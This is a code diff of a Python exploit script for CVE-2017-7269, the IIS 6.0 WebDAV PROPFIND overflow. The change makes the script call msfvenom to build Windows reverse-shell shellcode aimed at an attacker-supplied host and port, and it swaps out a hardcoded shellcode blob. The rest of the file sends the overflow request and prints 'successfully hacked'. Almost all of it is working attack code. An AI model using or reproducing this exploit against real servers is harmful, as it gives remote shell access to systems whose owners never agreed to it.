@@ -1,5 +1,7 @@
 import argparse
+import sys
 import socket
+import subprocess
 from log_colors import *
 from urllib.parse import urlparse
 
@@ -13,19 +15,42 @@ from urllib.parse import urlparse
 # "If: <http://" in a PROPFIND request, as exploited in the wild in July or August 2016.
 class CVE2017_7269:
 
-    def __init__(self, url):
-        print (LogColors.BLUE + "target: " + str(url) + "..." + LogColors.ENDC)
+    #headers = {"User-Agent" : "Mozilla/5.0"}
+
+    def __init__(self, url, lhost, lport):
+        print (LogColors.BLUE + "target: " + url + "..." + LogColors.ENDC)
         parse = urlparse(url)
         self.host = parse.hostname
         if parse.scheme == "http":
             self.port = 80
         else:
             self.port = 443
+        self.lhost, self.lport = lhost, lport
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    # exploit
-    def run(self):
-        print (LogColors.BLUE + "exploit: " + self.host + ":" + str(self.port) + LogColors.ENDC)
+    # generate shellcode payload
+    def generate_shellcode_payload(self):
+        print (LogColors.BLUE + "generate shellcode payload..." + LogColors.ENDC)
+        payload = "msfvenom -p windows/shell_reverse_tcp "
+        payload += "LHOST={} LPORT={}".format(self.lhost, self.lport) 
+        payload += " -s 2000 BufferRegister=ESI EXITFUNC=process -b \"\\x00\" -f"
+        payload += " raw PrependMigrate=true -e x86/unicode_mixed"
+        payload += " --arch x86 --platform windows"
+    
+        try:
+            p = subprocess.Popen(payload, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            shellcode, err = p.communicate()
+        except Exception:
+            print (LogColors.RED + "failed to generate shellcode payload :(" + LogColors.ENDC)
+            sys.exit()
+        else:
+            print (LogColors.YELLOW + "successfully generate shellcode payload..." + LogColors.ENDC)
+        
+        return shellcode.decode()
+    
+    # exploit run
+    def exploit(self):
+        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
         self.sock.connect((self.host, self.port))
         payload = 'PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'
         payload += 'If: <http://localhost/aaaaaaa'
@@ -33,20 +58,21 @@ class CVE2017_7269:
         payload += '>'
         payload += ' (Not <locktoken:write1>) <http://localhost/bbbbbbb'
         payload += '\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'
-        shellcode = 'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'
-        payload += shellcode
+        payload += self.generate_shellcode_payload()
         payload += '>\r\n\r\n'
         print (LogColors.YELLOW + 'sending payload ' + str(payload) + LogColors.ENDC)
         self.sock.send(payload.encode())
         data = self.sock.recv(80960)
         print (LogColors.YELLOW + "resp: " + str(data.decode()) + LogColors.ENDC)
         self.sock.close()
+        print (LogColors.GREEN + "successfully hacked :)" + LogColors.ENDC)
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-u','--url', required = True, help = "target IIS 6.0 url")
+    parser.add_argument('-i','--ip', required = True, help = "local host for rev shell")
+    parser.add_argument('-p','--port', required = True, help = "local port for rev shell")
     args = vars(parser.parse_args())
-    url = args['url']
-    cve = CVE2017_7269(url)
-    cve.run()
+    cve = CVE2017_7269(args["url"], args["ip"], args["port"])
+    cve.exploit()
 
